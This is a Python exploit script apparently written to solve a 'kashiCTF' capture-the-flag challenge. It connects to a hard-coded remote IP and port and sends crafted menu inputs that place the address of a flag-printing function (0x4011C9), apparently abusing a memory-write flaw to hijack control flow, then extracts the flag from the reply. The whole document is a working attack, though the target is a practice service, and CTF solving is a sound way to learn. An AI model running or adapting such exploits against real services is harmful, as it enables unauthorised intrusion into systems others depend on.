#!/usr/bin/env python3
import re
import socket
import sys


HOST = "34.126.223.46"
PORT = 17691
PRINT_FLAG = 0x4011C9


def recv_all(sock: socket.socket) -> bytes:
    data = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main() -> int:
    host = HOST
    port = PORT
    if len(sys.argv) >= 2:
        host = sys.argv[1]
    if len(sys.argv) >= 3:
        port = int(sys.argv[2])

    payload = f"2\n15\n0\n14\n{PRINT_FLAG}\n".encode()

    with socket.create_connection((host, port), timeout=10) as sock:
        sock.sendall(payload)
        out = recv_all(sock).decode(errors="replace")

    print(out, end="" if out.endswith("\n") else "\n")
    m = re.search(r"kashiCTF\{[^ \n]*\}", out)
    if m:
        print(f"[+] Flag: {m.group(0)}")
        return 0

    print("[-] Flag not found in output.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
